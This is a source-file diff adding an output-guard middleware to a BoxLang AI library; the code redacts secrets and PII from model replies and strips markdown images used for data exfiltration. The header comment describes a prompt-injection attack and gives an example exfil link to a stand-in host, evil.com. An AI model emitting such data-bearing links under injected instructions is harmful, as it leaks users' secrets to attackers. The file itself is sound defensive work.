@@ -1,0 +1,378 @@
+/**
+ * ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
+ * ║ OutputGuardMiddleware — Security Phase 3                                                          ║
+ * ╠═══════════════════════════════════════════════════════════════════════════════════════════════╣
+ * ║ Copyright Since 2025 by Ortus Solutions, Corp                                                     ║
+ * ║ www.ortussolutions.com                                                                            ║
+ * ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝
+ *
+ * Guards what comes OUT of the model. It scrubs the assistant response before it reaches your app
+ * or the end user, defending against two concrete risks:
+ *
+ *   1. Secret / PII leakage — the model echoes an email, SSN, credit card, API key, or private key
+ *      into its reply. These are redacted with a mask.
+ *   2. Data exfiltration — an injected instruction makes the model emit a data-bearing channel, the
+ *      classic markdown image `![x](https://evil.com?data=<secrets>)` that leaks when rendered.
+ *      These are stripped.
+ *
+ * The middleware is 100% offline (regex redaction + Luhn validation + exfil stripping via
+ * PromptSecurity). No second model, no network. Attach it on an agent (primary) or model:
+ *
+ *   var guard = new bxModules.bxai.models.middleware.security.OutputGuardMiddleware( action: "redact" )
+ *   aiAgent( name: "support", model: "openai", middleware: [ guard ] )
+ *
+ * Three actions:
+ *   - redact (default) : mask secrets + strip exfil, then let the CLEAN response through.
+ *   - flag             : leave content intact, but stamp findings on
+ *                        chatRequest.providerOptions.securityFindings and log.
+ *   - block            : throw BXAI.SecurityViolation when anything is found.
+ *
+ * Wiring notes:
+ *   - The primary seam is afterLLMCall: mutating the response struct in place IS honored by the
+ *     provider before it reads the content to return. Terminal middleware results are IGNORED on
+ *     afterLLMCall, so blocking must THROW.
+ *   - afterAgentRun is a weaker, best-effort seam: struct responses are mutated in place; a plain
+ *     string response cannot be rewritten (BoxLang value semantics), so redact degrades to a log
+ *     warning there while block still throws.
+ *   - Response content is resolved through PromptSecurity::getResponseText / setResponseText, the
+ *     single source of truth across OpenAI/compat, Claude, Gemini, Cohere, and streaming shapes.
+ *     Reasoning is resolved separately through getResponseReasoning / setResponseReasoning, and is
+ *     scanned even when the answer is empty — a model can name a secret while thinking and never
+ *     repeat it. Native `thinking` blocks are never rewritten: providers must echo them back
+ *     unmodified within a tool-use turn, so providers attach a derived copy for guards instead.
+ *   - ON A STREAM, TREAT THIS AS DETECTION ONLY. afterLLMCall fires once the stream has ended, by
+ *     which point every chunk has reached the caller's callback, so `block` throws after disclosure
+ *     and no redaction can un-send what the reader already saw. Nor does redaction reliably clean
+ *     what is KEPT: AiAgent accumulates its own string from the chunks as they arrive and persists
+ *     that to memory before any agent-level hook runs, so it never observes the scrubbed
+ *     streamState. Providers should still hand the hook their live streamState rather than a
+ *     throwaway literal (a discarded rewrite reports success while changing nothing), and callers
+ *     reading the returned aggregate do get the scrubbed text — but agent memory does not.
+ *     Withholding mid-stream, and scrubbing what memory keeps, both need a per-chunk seam: #257.
+ */
+import bxModules.bxai.models.middleware.BaseAiMiddleware;
+import bxModules.bxai.models.middleware.AiMiddlewareResult;
+import bxModules.bxai.models.security.PromptSecurity;
+
+class extends="BaseAiMiddleware" {
+
+	/**
+	 * What to do on findings: redact (default) | flag | block
+	 */
+	property name="action" type="string" default="redact";
+
+	/**
+	 * Which secret/PII redactors to apply (names from PromptSecurity.REDACTOR_PATTERNS)
+	 */
+	property name="redactors" type="array" default=[];
+
+	/**
+	 * Extra redactors as { name: "regex" | function( text, mask ) }. A string value is a regex
+	 * whose matches are masked; a closure performs dynamic redaction and returns the cleaned text.
+	 */
+	property name="customRedactors" type="struct" default={};
+
+	/**
+	 * The replacement mask for redacted secrets
+	 */
+	property name="mask" type="string" default="[REDACTED]";
+
+	/**
+	 * Remove markdown images to non-allowlisted hosts (data-exfil channel)
+	 */
+	property name="stripMarkdownImages" type="boolean" default=true;
+
+	/**
+	 * Rewrite markdown links to non-allowlisted hosts to their visible text
+	 */
+	property name="stripExternalLinks" type="boolean" default=false;
+
+	/**
+	 * Image hosts to keep (empty = strip all external images)
+	 */
+	property name="allowedImageHosts" type="array" default=[];
+
+	/**
+	 * Link hosts to keep (empty = strip all external links, when stripExternalLinks is on)
+	 */
+	property name="allowedLinkHosts" type="array" default=[];
+
+	/**
+	 * Also act on the agent's final output via afterAgentRun (weaker, best-effort seam)
+	 */
+	property name="scanAgentOutput" type="boolean" default=true;
+
+	/**
+	 * Constants
+	 */
+	static {
+		final VALID_ACTIONS = [ "redact", "flag", "block" ]
+	}
+
+	/**
+	 * Constructor
+	 *
+	 * @action              redact (default) | flag | block
+	 * @redactors           Redactor names to apply (default: PromptSecurity.DEFAULT_REDACTORS)
+	 * @customRedactors     Extra redactors as { name: "regex" | function( text, mask ) } (closure = dynamic redaction)
+	 * @mask                Replacement mask for secrets (default "[REDACTED]")
+	 * @stripMarkdownImages Remove markdown images to non-allowlisted hosts (default true)
+	 * @stripExternalLinks  Rewrite external markdown links to their text (default false)
+	 * @allowedImageHosts   Image hosts to keep (empty = strip all external)
+	 * @allowedLinkHosts    Link hosts to keep
+	 * @scanAgentOutput     Also act on afterAgentRun final output (default true)
+	 */
+	function init(
+		string action = "redact",
+		array redactors = [],
+		struct customRedactors = {},
+		string mask = "[REDACTED]",
+		boolean stripMarkdownImages = true,
+		boolean stripExternalLinks = false,
+		array allowedImageHosts = [],
+		array allowedLinkHosts = [],
+		boolean scanAgentOutput = true
+	){
+		if( !static.VALID_ACTIONS.findNoCase( arguments.action ) ){
+			throw(
+				type   : "InvalidAction",
+				message: "OutputGuardMiddleware action [#arguments.action#] is not valid. Valid actions are: [#static.VALID_ACTIONS.toList()#]"
+			)
+		}
+
+		variables.action              = arguments.action.lcase()
+		variables.redactors           = arguments.redactors
+		variables.customRedactors     = arguments.customRedactors
+		variables.mask                = arguments.mask
+		variables.stripMarkdownImages = arguments.stripMarkdownImages
+		variables.stripExternalLinks  = arguments.stripExternalLinks
+		variables.allowedImageHosts   = arguments.allowedImageHosts
+		variables.allowedLinkHosts    = arguments.allowedLinkHosts
+		variables.scanAgentOutput     = arguments.scanAgentOutput
+		variables.name                = "Output Guard Middleware"
+		variables.description         = "Redacts secrets/PII and strips data-exfiltration markdown from model responses."
+		return this
+	}
+
+	// ==================== Hooks ====================
+
+	/**
+	 * Scrub the model response after the LLM call. This is the primary, reliable seam:
+	 * mutating the response in place is honored before the provider returns the content.
+	 * Terminal results are ignored here, so blocking THROWS.
+	 */
+	AiMiddlewareResult function afterLLMCall( required struct context ){
+		var content = PromptSecurity::getResponseText( arguments.context )
+		// Reasoning is scanned independently of the answer. A model can name a secret while
+		// thinking and never repeat it in the answer, so bailing on empty content would skip the
+		// scan entirely on a thinking-only turn.
+		// Scrubbed part-by-part, not as one joined string: each OpenAI-envelope choice carries its
+		// own reasoning, and writing a joined value back would replace distinct per-choice reasoning
+		// with the same combined text.
+		var reasoningParts = PromptSecurity::getResponseReasoningParts( arguments.context )
+		if( !len( content ) && reasoningParts.isEmpty() ){
+			return AiMiddlewareResult.continue()
+		}
+
+		var scrubbed         = len( content ) ? scrub( content ) : { text: content, findings: [] }
+		var contentHit       = !scrubbed.findings.isEmpty()
+		var scrubbedParts    = []
+		var reasoningFindings = []
+		for( var part in reasoningParts ){
+			var scrubbedPart = len( part ) ? scrub( part ) : { text: part, findings: [] }
+			scrubbedParts.append( scrubbedPart.text )
+			reasoningFindings.append( scrubbedPart.findings, true )
+		}
+		var reasoningHit = !reasoningFindings.isEmpty()
+
+		if( !contentHit && !reasoningHit ){
+			return AiMiddlewareResult.continue()
+		}
+
+		var findings = []
+		findings.append( scrubbed.findings, true )
+		findings.append( reasoningFindings, true )
+
+		switch( variables.action ){
+			case "block":
+				logFindings( findings, "afterLLMCall" )
+				throwViolation( findings )
+				break
+			case "flag":
+				stampFindings( arguments.context.chatRequest ?: nullValue(), findings )
+				logFindings( findings, "afterLLMCall" )
+				break
+			default: // redact
+				if( contentHit ){
+					PromptSecurity::setResponseText( arguments.context, scrubbed.text )
+				}
+				// Writes to the provider-attached derived copy, never to a native `thinking`
+				// block - those must go back to the provider unmodified.
+				if( reasoningHit ){
+					PromptSecurity::setResponseReasoningParts( arguments.context, scrubbedParts )
+				}
+				stampFindings( arguments.context.chatRequest ?: nullValue(), findings )
+				logFindings( findings, "afterLLMCall" )
+		}
+
+		return AiMiddlewareResult.continue()
+	}
+
+	/**
+	 * Best-effort scrub of the agent's final output. Struct responses are mutated in place;
+	 * a plain-string response cannot be rewritten (value semantics), so redact degrades to a
+	 * warning while block still throws.
+	 */
+	AiMiddlewareResult function afterAgentRun( required struct context ){
+		if( !variables.scanAgentOutput || !arguments.context.keyExists( "response" ) ){
+			return AiMiddlewareResult.continue()
+		}
+
+		var response = arguments.context.response
+		if( isNull( response ) ){
+			return AiMiddlewareResult.continue()
+		}
+
+		// Resolve the text: simple string vs. a provider struct
+		var isSimple = isSimpleValue( response )
+		var content  = isSimple ? toString( response ) : PromptSecurity::getResponseText( { "result": response } )
+		// Reasoning is scanned here too, for the same reason as in afterLLMCall: a struct agent
+		// response carries the provider's derived reasoning, and bailing on empty content left the
+		// agent-level guard strictly weaker than the model-level one for the same payload.
+		var reasoningParts = isSimple ? [] : PromptSecurity::getResponseReasoningParts( { "result": response } )
+		if( !len( content ) && reasoningParts.isEmpty() ){
+			return AiMiddlewareResult.continue()
+		}
+
+		var scrubbed          = len( content ) ? scrub( content ) : { text: content, findings: [] }
+		var contentHit        = !scrubbed.findings.isEmpty()
+		var scrubbedParts     = []
+		var reasoningFindings = []
+		for( var part in reasoningParts ){
+			var scrubbedPart = len( part ) ? scrub( part ) : { text: part, findings: [] }
+			scrubbedParts.append( scrubbedPart.text )
+			reasoningFindings.append( scrubbedPart.findings, true )
+		}
+		var reasoningHit = !reasoningFindings.isEmpty()
+
+		if( !contentHit && !reasoningHit ){
+			return AiMiddlewareResult.continue()
+		}
+
+		var findings = []
+		findings.append( scrubbed.findings, true )
+		findings.append( reasoningFindings, true )
+
+		switch( variables.action ){
+			case "block":
+				logFindings( findings, "afterAgentRun" )
+				throwViolation( findings )
+				break
+			case "flag":
+				logFindings( findings, "afterAgentRun" )
+				break
+			default: // redact
+				if( isSimple ){
+					writeLog(
+						text: "OutputGuardMiddleware [afterAgentRun]: findings detected in a string agent response, which cannot be rewritten in place; "
+							& "use afterLLMCall redaction (attach on the model) for reliable scrubbing. Findings: " & summarize( findings ),
+						type: "warning",
+						log : "ai"
+					)
+				} else {
+					if( contentHit ){
+						PromptSecurity::setResponseText( { "result": response }, scrubbed.text )
+					}
+					if( reasoningHit ){
+						PromptSecurity::setResponseReasoningParts( { "result": response }, scrubbedParts )
+					}
+					logFindings( findings, "afterAgentRun" )
+				}
+		}
+
+		return AiMiddlewareResult.continue()
+	}
+
+	// ==================== Core ====================
+
+	/**
+	 * Run the redactor + exfil passes over a piece of text.
+	 *
+	 * @return { text: cleanedText, findings: [ ... redactor findings + exfil findings ] }
+	 */
+	private struct function scrub( required string text ){
+		var findings = []
+
+		var redacted = PromptSecurity::redactSecrets(
+			text     : arguments.text,
+			redactors: variables.redactors,
+			mask     : variables.mask,
+			custom   : variables.customRedactors
+		)
+		findings.append( redacted.findings, true )
+
+		var stripped = PromptSecurity::stripExfil(
+			text            : redacted.text,
+			stripImages     : variables.stripMarkdownImages,
+			stripLinks      : variables.stripExternalLinks,
+			allowedImageHosts: variables.allowedImageHosts,
+			allowedLinkHosts: variables.allowedLinkHosts
+		)
+		findings.append( stripped.findings, true )
+
+		return { "text": stripped.text, "findings": findings }
+	}
+
+	// ==================== Helpers ====================
+
+	/**
+	 * Throw a uniform security violation with the findings summary.
+	 */
+	private void function throwViolation( required array findings ){
+		throw(
+			type   : "BXAI.SecurityViolation",
+			message: "OutputGuard blocked the response: " & summarize( arguments.findings ),
+			detail : jsonSerialize( arguments.findings )
+		)
+	}
+
+	/**
+	 * Stamp findings on the chatRequest's providerOptions for downstream inspection.
+	 */
+	private void function stampFindings( any chatRequest, required array findings ){
+		if( isNull( arguments.chatRequest ) || !isObject( arguments.chatRequest ) ){
+			return
+		}
+		var providerOptions = arguments.chatRequest.getProviderOptions()
+		if( !providerOptions.keyExists( "securityFindings" ) ){
+			providerOptions[ "securityFindings" ] = []
+		}
+		providerOptions.securityFindings.append( arguments.findings, true )
+	}
+
+	/**
+	 * Log findings to the ai log.
+	 */
+	private void function logFindings( required array findings, required string phase ){
+		writeLog(
+			text: "OutputGuardMiddleware [#arguments.phase#]: #summarize( arguments.findings )#",
+			type: "warning",
+			log : "ai"
+		)
+	}
+
+	/**
+	 * Human-readable summary of findings (redactor names + exfil types, counts).
+	 */
+	private string function summarize( required array findings ){
+		var counts = {}
+		for( var f in arguments.findings ){
+			var label = f.redactor ?: ( f.type ?: "unknown" )
+			counts[ label ] = ( counts[ label ] ?: 0 ) + 1
+		}
+		return counts
+			.reduce( ( acc, k, v ) -> acc.append( "#k# x#v#" ), [] )
+			.toList( ", " )
+	}
+
+}
